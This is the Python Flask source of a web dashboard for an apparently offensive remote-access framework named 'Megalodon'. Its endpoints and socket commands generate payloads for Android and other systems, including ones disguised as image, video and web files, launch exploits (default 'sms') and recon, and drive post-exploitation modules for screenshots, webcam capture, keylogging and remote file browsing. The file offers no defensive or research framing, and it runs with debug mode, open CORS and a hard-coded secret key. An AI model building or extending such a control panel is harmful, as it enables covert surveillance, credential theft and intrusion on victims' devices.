#!/usr/bin/env python3

import sys
import os
import json
import time
import threading
from pathlib import Path
from flask import Flask, render_template, request, jsonify, Response, send_file
from flask_socketio import SocketIO, emit, join_room, leave_room
from flask_cors import CORS

sys.path.insert(0, os.path.dirname(__file__))

from core.framework import Megalodon
from core.logger import logger
from core.websocket_server import WebSocketServer
from core.target_manager import TargetManager

app = Flask(__name__)
app.config['SECRET_KEY'] = 'megalodon-secret-key-change-this'
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')
CORS(app)

megalodon = Megalodon()
target_mgr = TargetManager()
ws_server = None

@app.route('/')
def index():
    return render_template('dashboard.html')

@app.route('/api/status')
def get_status():
    status = megalodon.get_status()
    return jsonify(status)

@app.route('/api/targets')
def get_targets():
    targets = target_mgr.list_targets()
    return jsonify(targets)

@app.route('/api/sessions')
def get_sessions():
    sessions = megalodon.session.list_sessions()
    return jsonify(sessions)

@app.route('/api/payload/generate/<os_type>')
def generate_payload(os_type):
    result = megalodon.generate_payload(os_type)
    return jsonify(result)

@app.route('/api/exploit/run/<method>')
def run_exploit(method):
    result = megalodon.run_exploit(method)
    return jsonify(result)

@app.route('/api/screenshot')
def take_screenshot():
    try:
        from modules.post_exploit.screenshot_capture import run
        result = run()
        return jsonify(result)
    except Exception as e:
        return jsonify({'error': str(e)})

@app.route('/api/webcam')
def capture_webcam():
    try:
        from modules.post_exploit.webcam_capture import run
        result = run()
        return jsonify(result)
    except Exception as e:
        return jsonify({'error': str(e)})

@app.route('/api/keylog/start')
def start_keylogger():
    try:
        from modules.post_exploit.keylogger import start
        result = start()
        return jsonify(result)
    except Exception as e:
        return jsonify({'error': str(e)})

@app.route('/api/keylog/stop')
def stop_keylogger():
    try:
        from modules.post_exploit.keylogger import stop
        result = stop()
        return jsonify(result)
    except Exception as e:
        return jsonify({'error': str(e)})

@app.route('/api/keylog/logs')
def get_keylogs():
    try:
        from modules.post_exploit.keylogger import get_logs
        result = get_logs()
        return jsonify(result)
    except Exception as e:
        return jsonify({'error': str(e)})

@app.route('/api/files/list/<path:path>')
def list_files(path):
    try:
        from modules.post_exploit.file_manager import list_files
        result = list_files(path)
        return jsonify(result)
    except Exception as e:
        return jsonify({'error': str(e)})

@app.route('/api/payload/generate/image/<os_type>')
def generate_image_payload(os_type):
    try:
        from modules.payloads.image_payload import generate
        result = generate(os_type)
        return jsonify(result)
    except Exception as e:
        return jsonify({'error': str(e)})

@app.route('/api/payload/generate/video/<os_type>')
def generate_video_payload(os_type):
    try:
        from modules.payloads.video_payload import generate
        result = generate(os_type)
        return jsonify(result)
    except Exception as e:
        return jsonify({'error': str(e)})

@app.route('/api/payload/generate/web/<os_type>')
def generate_web_payload(os_type):
    try:
        from modules.payloads.web_payload import generate
        result = generate(os_type)
        return jsonify(result)
    except Exception as e:
        return jsonify({'error': str(e)})

@app.route('/api/ws/start')
def start_websocket():
    global ws_server
    if ws_server is None:
        ws_server = WebSocketServer()
        thread = threading.Thread(target=ws_server.start, daemon=True)
        thread.start()
        return jsonify({'success': True, 'status': 'started'})
    return jsonify({'success': False, 'status': 'already_running'})

@app.route('/api/ws/stop')
def stop_websocket():
    global ws_server
    if ws_server:
        ws_server.stop()
        ws_server = None
        return jsonify({'success': True, 'status': 'stopped'})
    return jsonify({'success': False, 'status': 'not_running'})

@app.route('/api/recon/scan')
def run_recon():
    result = megalodon.run_recon()
    return jsonify(result)

@socketio.on('connect')
def handle_connect():
    emit('status', {'message': 'Connected to Megalodon Web Dashboard'})
    logger.info('Web client connected')

@socketio.on('disconnect')
def handle_disconnect():
    logger.info('Web client disconnected')

@socketio.on('command')
def handle_command(data):
    command = data.get('command')
    params = data.get('params', {})
    
    try:
        if command == 'recon':
            result = megalodon.run_recon()
        elif command == 'exploit':
            result = megalodon.run_exploit(params.get('method', 'sms'))
        elif command == 'generate_payload':
            result = megalodon.generate_payload(params.get('os', 'android'))
        elif command == 'screenshot':
            from modules.post_exploit.screenshot_capture import run
            result = run()
        elif command == 'webcam':
            from modules.post_exploit.webcam_capture import run
            result = run()
        elif command == 'keylog_start':
            from modules.post_exploit.keylogger import start
            result = start()
        elif command == 'keylog_stop':
            from modules.post_exploit.keylogger import stop
            result = stop()
        elif command == 'keylog_get':
            from modules.post_exploit.keylogger import get_logs
            result = get_logs()
        else:
            result = {'error': f'Unknown command: {command}'}
        
        emit('command_result', {'command': command, 'result': result})
        
    except Exception as e:
        emit('command_result', {'command': command, 'error': str(e)})

if __name__ == '__main__':
    os.makedirs('templates', exist_ok=True)
    os.makedirs('static', exist_ok=True)
    socketio.run(app, host='0.0.0.0', port=5000, debug=True)
